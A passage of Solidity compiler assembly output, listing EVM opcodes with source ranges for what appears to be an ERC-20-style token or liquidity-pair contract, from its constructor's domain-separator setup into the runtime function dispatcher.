									"name": "PUSH",
									"value": "1"
								},
								{
									"begin": 1404,
									"end": 1414,
									"name": "DUP2"
								},
								{
									"begin": 1404,
									"end": 1414,
									"name": "MSTORE"
								},
								{
									"begin": -1,
									"end": -1,
									"name": "PUSH",
									"value": "31"
								},
								{
									"begin": -1,
									"end": -1,
									"name": "PUSH",
									"value": "F8"
								},
								{
									"begin": -1,
									"end": -1,
									"name": "SHL"
								},
								{
									"begin": 1404,
									"end": 1414,
									"name": "SWAP1"
								},
								{
									"begin": 1404,
									"end": 1414,
									"name": "DUP6"
								},
								{
									"begin": 1404,
									"end": 1414,
									"name": "ADD"
								},
								{
									"begin": 1404,
									"end": 1414,
									"name": "MSTORE"
								},
								{
									"begin": 1175,
									"end": 1485,
									"name": "DUP3"
								},
								{
									"begin": 1175,
									"end": 1485,
									"name": "MLOAD"
								},
								{
									"begin": 1175,
									"end": 1485,
									"name": "DUP1"
								},
								{
									"begin": 1175,
									"end": 1485,
									"name": "DUP6"
								},
								{
									"begin": 1175,
									"end": 1485,
									"name": "ADD"
								},
								{
									"begin": 1175,
									"end": 1485,
									"name": "SWAP3"
								},
								{
									"begin": 1175,
									"end": 1485,
									"name": "SWAP1"
								},
								{
									"begin": 1175,
									"end": 1485,
									"name": "SWAP3"
								},
								{
									"begin": 1175,
									"end": 1485,
									"name": "MSTORE"
								},
								{
									"begin": 1354,
									"end": 1376,
									"name": "PUSH",
									"value": "6A36D39F32C2225411D16C8F56813B9117E6EB8BF3D2893C5FC62411565CFCFE"
								},
								{
									"begin": 1175,
									"end": 1485,
									"name": "DUP3"
								},
								{
									"begin": 1175,
									"end": 1485,
									"name": "DUP5"
								},
								{
									"begin": 1175,
									"end": 1485,
									"name": "ADD"
								},
								{
									"begin": 1175,
									"end": 1485,
									"name": "MSTORE"
								},
								{
									"begin": 1394,
									"end": 1415,
									"name": "PUSH",
									"value": "C89EFDAA54C0F20C7ADF612882DF0950F5A951637E0307CDCB4C672F298B8BC6"
								},
								{
									"begin": 1175,
									"end": 1485,
									"name": "PUSH",
									"value": "60"
								},
								{
									"begin": 1175,
									"end": 1485,
									"name": "DUP4"
								},
								{
									"begin": 1175,
									"end": 1485,
									"name": "ADD"
								},
								{
									"begin": 1175,
									"end": 1485,
									"name": "MSTORE"
								},
								{
									"begin": 1175,
									"end": 1485,
									"name": "PUSH",
									"value": "80"
								},
								{
									"begin": 1175,
									"end": 1485,
									"name": "DUP3"
								},
								{
									"begin": 1175,
									"end": 1485,
									"name": "ADD"
								},
								{
									"begin": 1175,
									"end": 1485,
									"name": "SWAP6"
								},
								{
									"begin": 1175,
									"end": 1485,
									"name": "SWAP1"
								},
								{
									"begin": 1175,
									"end": 1485,
									"name": "SWAP6"
								},
								{
									"begin": 1175,
									"end": 1485,
									"name": "MSTORE"
								},
								{
									"begin": 1466,
									"end": 1470,
									"name": "ADDRESS"
								},
								{
									"begin": 1175,
									"end": 1485,
									"name": "PUSH",
									"value": "A0"
								},
								{
									"begin": 1175,
									"end": 1485,
									"name": "DUP1"
								},
								{
									"begin": 1175,
									"end": 1485,
									"name": "DUP4"
								},
								{
									"begin": 1175,
									"end": 1485,
									"name": "ADD"
								},
								{
									"begin": 1175,
									"end": 1485,
									"name": "SWAP2"
								},
								{
									"begin": 1175,
									"end": 1485,
									"name": "SWAP1"
								},
								{
									"begin": 1175,
									"end": 1485,
									"name": "SWAP2"
								},
								{
									"begin": 1175,
									"end": 1485,
									"name": "MSTORE"
								},
								{
									"begin": 1175,
									"end": 1485,
									"name": "DUP3"
								},
								{
									"begin": 1175,
									"end": 1485,
									"name": "MLOAD"
								},
								{
									"begin": 26,
									"end": 47,
									"name": "DUP1"
								},
								{
									"begin": 26,
									"end": 47,
									"name": "DUP4"
								},
								{
									"begin": 26,
									"end": 47,
									"name": "SUB"
								},
								{
									"begin": 22,
									"end": 54,
									"name": "SWAP1"
								},
								{
									"begin": 22,
									"end": 54,
									"name": "SWAP2"
								},
								{
									"begin": 22,
									"end": 54,
									"name": "ADD"
								},
								{
									"begin": 6,
									"end": 55,
									"name": "DUP2"
								},
								{
									"begin": 6,
									"end": 55,
									"name": "MSTORE"
								},
								{
									"begin": 1175,
									"end": 1485,
									"name": "PUSH",
									"value": "C0"
								},
								{
									"begin": 1175,
									"end": 1485,
									"name": "SWAP1"
								},
								{
									"begin": 1175,
									"end": 1485,
									"name": "SWAP2"
								},
								{
									"begin": 1175,
									"end": 1485,
									"name": "ADD"
								},
								{
									"begin": 1175,
									"end": 1485,
									"name": "SWAP1"
								},
								{
									"begin": 1175,
									"end": 1485,
									"name": "SWAP2"
								},
								{
									"begin": 1175,
									"end": 1485,
									"name": "MSTORE"
								},
								{
									"begin": 1152,
									"end": 1495,
									"name": "DUP1"
								},
								{
									"begin": 1152,
									"end": 1495,
									"name": "MLOAD"
								},
								{
									"begin": 1152,
									"end": 1495,
									"name": "SWAP2"
								},
								{
									"begin": 1152,
									"end": 1495,
									"name": "ADD"
								},
								{
									"begin": 1152,
									"end": 1495,
									"name": "KECCAK256"
								},
								{
									"begin": 1133,
									"end": 1149,
									"name": "PUSH",
									"value": "4"
								},
								{
									"begin": 1133,
									"end": 1495,
									"name": "SSTORE"
								},
								{
									"begin": -1,
									"end": -1,
									"name": "POP"
								},
								{
									"begin": 2389,
									"end": 2409,
									"name": "DUP1"
								},
								{
									"begin": 2389,
									"end": 2409,
									"name": "SLOAD"
								},
								{
									"begin": -1,
									"end": -1,
									"name": "PUSH",
									"value": "1"
								},
								{
									"begin": -1,
									"end": -1,
									"name": "PUSH",
									"value": "1"
								},
								{
									"begin": -1,
									"end": -1,
									"name": "PUSH",
									"value": "A0"
								},
								{
									"begin": -1,
									"end": -1,
									"name": "SHL"
								},
								{
									"begin": -1,
									"end": -1,
									"name": "SUB"
								},
								{
									"begin": -1,
									"end": -1,
									"name": "NOT"
								},
								{
									"begin": 2389,
									"end": 2409,
									"name": "AND"
								},
								{
									"begin": 2399,
									"end": 2409,
									"name": "CALLER"
								},
								{
									"begin": 2389,
									"end": 2409,
									"name": "OR"
								},
								{
									"begin": 2389,
									"end": 2409,
									"name": "SWAP1"
								},
								{
									"begin": 2389,
									"end": 2409,
									"name": "SSTORE"
								},
								{
									"begin": 226,
									"end": 18384,
									"name": "PUSH #[$]",
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 226,
									"end": 18384,
									"name": "DUP1"
								},
								{
									"begin": 226,
									"end": 18384,
									"name": "PUSH [$]",
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 226,
									"end": 18384,
									"name": "PUSH",
									"value": "0"
								},
								{
									"begin": 226,
									"end": 18384,
									"name": "CODECOPY"
								},
								{
									"begin": 226,
									"end": 18384,
									"name": "PUSH",
									"value": "0"
								},
								{
									"begin": 226,
									"end": 18384,
									"name": "RETURN"
								}
							],
							".data": {
								"0": {
									".auxdata": "a265627a7a72315820cd5f612284cf3e663022f426c74f2bb28d38659c6e56172357818a55c1bf86f864736f6c63430005100032",
									".code": [
										{
											"begin": 226,
											"end": 18384,
											"name": "PUSH",
											"value": "80"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "MSTORE"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "CALLVALUE"
										},
										{
											"begin": 8,
											"end": 17,
											"name": "DUP1"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "PUSH [tag]",
											"value": "1"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPI"
										},
										{
											"begin": 30,
											"end": 31,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 27,
											"end": 28,
											"name": "DUP1"
										},
										{
											"begin": 20,
											"end": 32,
											"name": "REVERT"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "tag",
											"value": "1"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPDEST"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "POP"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "CALLDATASIZE"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "LT"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "PUSH [tag]",
											"value": "2"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "JUMPI"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "CALLDATALOAD"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "PUSH",
											"value": "E0"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "SHR"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "DUP1"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "PUSH",
											"value": "70A08231"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "GT"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "PUSH [tag]",
											"value": "34"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "JUMPI"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "DUP1"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "PUSH",
											"value": "BC25CF77"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "GT"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "PUSH [tag]",
											"value": "35"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "JUMPI"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "DUP1"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "PUSH",
											"value": "DCBBB373"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "GT"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "PUSH [tag]",
											"value": "36"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "JUMPI"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "DUP1"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "PUSH",
											"value": "DCBBB373"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "EQ"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "PUSH [tag]",
											"value": "30"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "JUMPI"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "DUP1"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "PUSH",
											"value": "DD62ED3E"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "EQ"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "PUSH [tag]",
											"value": "31"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "JUMPI"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "DUP1"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "PUSH",
											"value": "F317739C"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "EQ"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "PUSH [tag]",
											"value": "32"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "JUMPI"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "DUP1"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "PUSH",
											"value": "FFF6CAE9"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "EQ"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "PUSH [tag]",
											"value": "33"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "JUMPI"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "PUSH [tag]",
											"value": "2"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "JUMP"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "tag",
											"value": "36"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "JUMPDEST"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "DUP1"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "PUSH",
											"value": "BC25CF77"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "EQ"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "PUSH [tag]",
											"value": "26"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "JUMPI"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "DUP1"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "PUSH",
											"value": "C45A0155"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "EQ"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "PUSH [tag]",
											"value": "27"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "JUMPI"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "DUP1"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "PUSH",
											"value": "D21220A7"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "EQ"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "PUSH [tag]",
											"value": "28"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "JUMPI"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "DUP1"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "PUSH",
											"value": "D505ACCF"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "EQ"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "PUSH [tag]",
											"value": "29"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "JUMPI"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "PUSH [tag]",
											"value": "2"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "JUMP"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "tag",
											"value": "35"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "JUMPDEST"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "DUP1"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "PUSH",
											"value": "900820D8"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "GT"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "PUSH [tag]",
											"value": "37"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "JUMPI"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "DUP1"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "PUSH",
											"value": "900820D8"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "EQ"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "PUSH [tag]",
											"value": "22"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "JUMPI"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "DUP1"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "PUSH",
											"value": "95D89B41"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "EQ"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "PUSH [tag]",
											"value": "23"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "JUMPI"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "DUP1"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "PUSH",
											"value": "A9059CBB"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "EQ"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "PUSH [tag]",
											"value": "24"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "JUMPI"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "DUP1"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "PUSH",
											"value": "BA9A7A56"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "EQ"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "PUSH [tag]",
											"value": "25"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "JUMPI"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "PUSH [tag]",
											"value": "2"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "JUMP"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "tag",
											"value": "37"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "JUMPDEST"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "DUP1"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "PUSH",
											"value": "70A08231"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "EQ"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "PUSH [tag]",
											"value": "18"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "JUMPI"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "DUP1"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "PUSH",
											"value": "7464FC3D"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "EQ"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "PUSH [tag]",
											"value": "19"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "JUMPI"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "DUP1"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "PUSH",
											"value": "7ECEBE00"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "EQ"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "PUSH [tag]",
											"value": "20"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "JUMPI"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "DUP1"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "PUSH",
											"value": "89AFCB44"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "EQ"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "PUSH [tag]",
											"value": "21"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "JUMPI"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "PUSH [tag]",
											"value": "2"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "JUMP"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "tag",
											"value": "34"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "JUMPDEST"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "DUP1"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "PUSH",
											"value": "23B872DD"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "GT"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "PUSH [tag]",
											"value": "38"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "JUMPI"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "DUP1"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "PUSH",
											"value": "47D5D856"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "GT"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "PUSH [tag]",
											"value": "39"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "JUMPI"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "DUP1"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "PUSH",
											"value": "47D5D856"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "EQ"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "PUSH [tag]",
											"value": "14"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "JUMPI"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "DUP1"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "PUSH",
											"value": "5909C0D5"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "EQ"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "PUSH [tag]",
											"value": "15"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "JUMPI"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "DUP1"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "PUSH",
											"value": "5A3D5493"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "EQ"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "PUSH [tag]",
											"value": "16"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "JUMPI"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "DUP1"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "PUSH",
											"value": "6A627842"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "EQ"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "PUSH [tag]",
											"value": "17"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "JUMPI"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "PUSH [tag]",
											"value": "2"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "JUMP"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "tag",
											"value": "39"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "JUMPDEST"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "DUP1"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "PUSH",
											"value": "23B872DD"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "EQ"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "PUSH [tag]",
											"value": "10"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "JUMPI"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "DUP1"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "PUSH",
											"value": "30ADF81F"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "EQ"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "PUSH [tag]",
											"value": "11"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "JUMPI"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "DUP1"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "PUSH",
											"value": "313CE567"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "EQ"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "PUSH [tag]",
											"value": "12"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "JUMPI"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "DUP1"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "PUSH",
											"value": "3644E515"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "EQ"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "PUSH [tag]",
											"value": "13"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "JUMPI"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "PUSH [tag]",
											"value": "2"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "JUMP"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "tag",
											"value": "38"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "JUMPDEST"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "DUP1"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "PUSH",
											"value": "95EA7B3"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "GT"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "PUSH [tag]",
											"value": "40"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "JUMPI"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "DUP1"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "PUSH",
											"value": "95EA7B3"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "EQ"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "PUSH [tag]",
											"value": "6"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "JUMPI"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "DUP1"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "PUSH",
											"value": "DFE1681"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "EQ"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "PUSH [tag]",
											"value": "7"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "JUMPI"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "DUP1"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "PUSH",
											"value": "1794BB3C"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "EQ"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "PUSH [tag]",
											"value": "8"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "JUMPI"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "DUP1"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "PUSH",
											"value": "18160DDD"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "EQ"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "PUSH [tag]",
											"value": "9"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "JUMPI"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "PUSH [tag]",
											"value": "2"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "JUMP"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "tag",
											"value": "40"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "JUMPDEST"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "DUP1"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "PUSH",
											"value": "22C0D9F"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "EQ"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "PUSH [tag]",
											"value": "3"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "JUMPI"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "DUP1"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "PUSH",
											"value": "6FDDE03"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "EQ"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "PUSH [tag]",
											"value": "4"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "JUMPI"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "DUP1"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "PUSH",
											"value": "902F1AC"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "EQ"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "PUSH [tag]",
											"value": "5"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "JUMPI"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "tag",
											"value": "2"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "JUMPDEST"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "DUP1"
										},
										{
											"begin": 226,
											"end": 18384,
											"name": "REVERT"
										},
										{
											"begin": 11600,
											"end": 14446,
											"name": "tag",
											"value": "3"
										},
										{
											"begin": 11600,
											"end": 14446,
											"name": "JUMPDEST"
										},
										{
											"begin": 11600,
											"end": 14446,
											"name": "PUSH [tag]",
											"value": "41"
										},
										{
											"begin": 11600,
											"end": 14446,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 11600,
											"end": 14446,
											"name": "DUP1"
										},
										{
											"begin": 11600,
											"end": 14446,
											"name": "CALLDATASIZE"
										},
										{
											"begin": 11600,
											"end": 14446,
											"name": "SUB"
										},
										{
											"begin": 13,
											"end": 16,
											"name": "PUSH",
											"value": "80"
										},
										{
											"begin": 8,
											"end": 11,
											"name": "DUP2"
										},
										{
											"begin": 5,
											"end": 17,
											"name": "LT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "ISZERO"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "PUSH [tag]",
											"value": "42"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPI"
										},
										{
											"begin": 30,
											"end": 31,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 27,
											"end": 28,
											"name": "DUP1"
										},
										{
											"begin": 20,
											"end": 32,
											"name": "REVERT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "tag",
											"value": "42"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPDEST"
										},
										{
											"begin": 11600,
											"end": 14446,
											"name": "DUP2"
										},
										{
											"begin": 11600,
											"end": 14446,
											"name": "CALLDATALOAD"
										},
										{
											"begin": 11600,
											"end": 14446,
											"name": "SWAP2"
										},
										{
											"begin": 11600,
											"end": 14446,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 11600,
											"end": 14446,
											"name": "DUP2"
										},
										{
											"begin": 11600,
											"end": 14446,
											"name": "ADD"
										},
										{
											"begin": 11600,
											"end": 14446,
											"name": "CALLDATALOAD"
										},
										{
											"begin": 11600,
											"end": 14446,
											"name": "SWAP2"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 11600,
											"end": 14446,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 11600,
											"end": 14446,
											"name": "DUP4"
										},
										{
											"begin": 11600,
											"end": 14446,
											"name": "ADD"
										},
										{
											"begin": 11600,
											"end": 14446,
											"name": "CALLDATALOAD"
										},
										{
											"begin": 11600,
											"end": 14446,
											"name": "AND"
										},
										{
											"begin": 11600,
											"end": 14446,
											"name": "SWAP2"
										},
										{
											"begin": 11600,
											"end": 14446,
											"name": "SWAP1"
										},
										{
											"begin": 11600,
											"end": 14446,
											"name": "DUP2"
										},
										{
											"begin": 11600,
											"end": 14446,
											"name": "ADD"
										},
										{
											"begin": 11600,
											"end": 14446,
											"name": "SWAP1"
										},
										{
											"begin": 11600,
											"end": 14446,
											"name": "PUSH",
											"value": "80"
										},
										{
											"begin": 11600,
											"end": 14446,
											"name": "DUP2"
										},
										{
